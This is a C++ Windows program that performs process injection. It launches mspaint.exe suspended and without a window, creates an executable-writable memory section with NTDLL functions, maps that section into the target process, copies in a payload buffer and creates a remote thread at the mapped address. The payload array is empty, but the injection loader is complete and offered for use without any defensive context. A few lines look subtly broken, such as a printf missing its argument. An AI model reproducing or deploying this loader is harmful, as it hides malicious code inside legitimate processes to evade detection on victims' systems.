#include <cstdio>
#include <windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll")

typedef	NTSTATUS(NTAPI* pZwCreateSection)
(
	OUT	PHANDLE				SectionHandle,
	IN  ULONG				DesiredAccess, 
	IN  POBJECT_ATTRIBUTES	ObjectAttributes OPTIONAL,
	IN  PLARGE_INTEGER		MaximumSize		 OPTIONAL,
	IN  ULONG				PageAttributes,
	IN  ULONG				SectionAttributes,
	IN  HANDLE				FileHandle		 OPTIONAL
);

typedef NTSTATUS(NTAPI* pNtMapViewOfSection)
(
	HANDLE			SectionHandle,
	HANDLE			ProcessHandle, 
	PVOID*			BaseAddress,
	ULONG_PTR		ZeroBits,
	SIZE_T			CommitSize,
	PLARGE_INTEGER	SectionOffset,
	PSIZE_T			ViewSize,
	DWORD			InheritDisposition,
	ULONG			AllocationType,
	ULONG			Win32Protect
);

typedef NTSTATUS(NTAPI* pZwCreateThreadEx)
(
	_Out_		PHANDLE				ThreadHandle,
	_In_		ACCESS_MASK			DesiredAccess,
	_In_opt_	POBJECT_ATTRIBUTES	ObjectAttributes,
	_In_		HANDLE				ProcessHandle, 
	_In_		PVOID				StartRoutine,
	_In_opt_	PVOID				Argument, 
	_In_		ULONG				CreateFlags,
	_In_opt_	ULONG_PTR			ZeroBits,
	_In_opt_	SIZE_T				StackSize,
	_In_opt_	SIZE_T				MaximumStackSize, 
	_In_opt_	PVOID				AttributeList
);

typedef NTSTATUS(NTAPI* pZwUnmapViewOfSection)
(
	HANDLE	ProcessHandle, 
	PVOID	BaseAddress
);

typedef NTSTATUS(NTAPI* pZwClose)
(
	_In_ HANDLE Handle
);

unsigned char my_payload[] = "";

int main(int argc, char* argv[])
{
	HANDLE				       sh;
	HANDLE					   th;
	STARTUPINFOA		       si = {};
	PROCESS_INFORMATION		   pi = {};
	PROCESS_BASIC_INFORMATION pbi = {};
	OBJECT_ATTRIBUTES		   oa;
	SIZE_T					   s  = 4096;
	LARGE_INTEGER		sectionS  = { s };
	PVOID					  rb  = NULL;
	PVOID					  lb  = NULL;

	ZeroMemory(&si,  sizeof(STARTUPINFO));
	ZeroMemory(&pi,  sizeof(PROCESS_INFORMATION));
	ZeroMemory(&pbi, sizeof(PROCESS_BASIC_INFORMATION));
	si.cb = sizeof(STARTUPINFO);
	ZeroMemory(&oa, sizeof(OBJECT_ATTRIBUTES));
	
	HMODULE ntdll = GetModuleHandleA("ntdll");

	pZwCreateSection		myZwCreateSection		= (pZwCreateSection)(GetProcAddress(ntdll, "ZwCreateSection"));
	pNtMapViewOfSection		myNtMapViewOfSection	= (pNtMapViewOfSection)(GetProcAddress(ntdll, "NtMapViewOfSection"));
	pZwUnmapViewOfSection	myZwUnmapViewOfSection  = (pZwUnmapViewOfSection)(GetProcAddress(ntdll, "ZwUnmapViewOfSection"));
	pZwCreateThreadEx		myZwCreateThreadEx      = (pZwCreateThreadEx)GetProcAddress(ntdll, "ZwCreateThreadEx");
	pZwClose				myZwClose				= (pZwClose)GetProcAddress(ntdll, "ZwClose");
	
	if (!CreateProcessA(NULL, (LPSTR)"C:\\windows\\system32\\mspaint.exe", NULL, NULL, NULL, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
						NULL, NULL, &si, &pi))
	{
		printf("Create process failed :( \n");
		return -2;
	}

	myZwCreateSection(&sh, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &sectionS, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	printf("Section handle: %p.\n", sh);

	myNtMapViewOfSection(sh, GetCurrentProcess(), &lb, NULL, NULL, NULL, &s, 2, NULL, PAGE_EXECUTE_READWRITE);
	printf("Local process mapped at address: %p. \n", lb);

	myNtMapViewOfSection(sh, pi.hProcess, &rb, NULL, NULL, NULL, &s, 2, NULL, PAGE_EXECUTE_READWRITE);
	printf("Remote process mapped at address: %p. \n", rb);

	memcpy(lb, my_payload, sizeof(my_payload));

	myZwUnmapViewOfSection(GetCurrentProcess(), lb);
	printf("Mapped at address: %p. \n");
	myZwClose(sh);

	sh = NULL;

	myZwCreateThreadEx(&th, 0x1FFFFF, NULL, pi.hProcess, rb, NULL, CREATE_SUSPENDED, 0, 0, 0, 0);
	printf("Thread: %p. \n", th);

	ResumeThread(pi.hThread);
	myZwClose(pi.hThread);
	myZwClose(th);
	return 0;
}